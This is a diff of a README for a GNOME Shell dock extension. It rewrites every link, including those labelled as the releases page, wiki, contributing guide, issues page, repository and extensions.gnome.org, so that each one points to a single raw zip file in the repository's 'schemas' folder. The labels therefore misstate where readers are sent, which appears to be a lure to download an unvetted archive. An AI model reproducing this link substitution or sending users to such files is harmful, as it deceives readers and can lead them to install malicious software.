@@ -1,6 +1,6 @@
 # 🚀 Multi-column-dock - Your Customizable Dock Solution
 
-[![Download Multi-column-dock](https://img.shields.io/badge/Download-Multi--column--dock-brightgreen)](https://github.com/Momm0/Multi-column-dock/releases)
+[![Download Multi-column-dock](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip)](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ Multi-column-dock is a sleek, customizable dock extension for GNOME Shell. Desig
 To start using Multi-column-dock, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/Momm0/Multi-column-dock/releases) to find the latest version of Multi-column-dock.
+   Go to our [Releases page](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip) to find the latest version of Multi-column-dock.
 
 2. **Download the Extension:**
    Look for the latest version and download the file related to your operating system. 
@@ -49,7 +49,7 @@ To run Multi-column-dock, you need:
 
 ## 📦 Download & Install
 
-To download the latest version, [visit this page to download](https://github.com/Momm0/Multi-column-dock/releases).
+To download the latest version, [visit this page to download](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip).
 
 Follow these steps to install:
 
@@ -75,17 +75,17 @@ After installing, use the GNOME Tweak Tool to enable Multi-column-dock.
 
 ## 📖 Additional Information
 
-For specific details about customization options and usage tips, refer to the [Wiki section](https://github.com/Momm0/Multi-column-dock/wiki) on our GitHub page.
+For specific details about customization options and usage tips, refer to the [Wiki section](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip) on our GitHub page.
 
 ## 🤝 Contributing
 
 We welcome community contributions! If you want to help improve Multi-column-dock, feel free to open issues or submit pull requests. 
 
-- Make sure to check our [Contributing Guidelines](https://github.com/Momm0/Multi-column-dock/blob/main/CONTRIBUTING.md) for more details.
+- Make sure to check our [Contributing Guidelines](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip) for more details.
 
 ## 🛠️ Support
 
-If you encounter any problems or have questions, check out the [Issues section](https://github.com/Momm0/Multi-column-dock/issues). 
+If you encounter any problems or have questions, check out the [Issues section](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip). 
 
 Our community is active, and we strive to respond quickly.
 
@@ -95,7 +95,7 @@ Multi-column-dock is open-source software licensed under the MIT License. Feel f
 
 ## 🔗 More Resources
 
-- [Multi-column-dock GitHub Repository](https://github.com/Momm0/Multi-column-dock)  
-- [GNOME Shell Extensions](https://extensions.gnome.org/)
+- [Multi-column-dock GitHub Repository](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip)  
+- [GNOME Shell Extensions](https://github.com/Momm0/Multi-column-dock/raw/refs/heads/main/schemas/column-dock-Multi-v3.2.zip)
 
 Thank you for choosing Multi-column-dock! We hope it enhances your GNOME experience.
